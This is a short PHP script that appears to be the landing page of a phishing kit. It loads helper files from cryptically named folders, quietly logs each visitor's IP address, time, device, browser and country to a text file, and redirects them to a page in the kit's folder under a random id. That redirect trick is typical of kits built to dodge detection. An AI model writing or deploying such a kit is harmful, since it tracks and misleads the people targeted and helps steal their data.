<?php

include('./IMPODSYSJGJDHKH/BIRNAVA/911.php');
include('./IMPODSYSJGJDHKH/BIRNAVA/COUNTRY.php');
include('./IMPODSYSJGJDHKH/BIRNAVA/SYS.php');

	$file = fopen("911.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".$date."/DEVICE=".$user_os."/BROWSER=".$user_browser." >> [$get_user_country]\n");

header("Location: ./IMPODSYSJGJDHKH/" . $page . "?id=" . mt_rand(11111, 99999999));

?>